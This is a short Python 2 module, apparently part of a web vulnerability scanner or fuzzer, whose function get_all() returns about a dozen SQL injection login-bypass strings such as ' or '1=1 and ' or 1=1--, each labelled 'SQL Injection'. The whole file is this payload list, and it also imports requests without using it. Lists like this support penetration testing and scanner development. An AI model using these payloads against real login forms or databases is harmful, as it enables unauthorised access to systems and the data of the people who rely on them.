import requests

def get_all():
	payloads = ["' or '1=1","'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "' or 1=1/*", "' or 1=1--"]

	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads
	
if __name__ == "__main__":	
	print get_all()
